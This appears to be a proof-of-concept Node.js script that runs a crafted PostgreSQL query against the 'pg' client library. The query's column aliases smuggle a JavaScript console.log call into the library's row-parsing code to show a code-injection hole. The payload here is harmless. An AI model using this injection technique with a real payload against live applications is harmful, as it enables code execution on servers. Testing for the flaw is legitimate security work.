const { Client } = require('pg')
const client = new Client(require('./src/config/db'))
client.connect()

const sql = `SELECT 1 AS "\\'/*", 2 AS "\\'*/\n + console.log(\`Vulnerable!\`)] = null;\n//"`

client.query(sql, (err, res) => {
  client.end()
})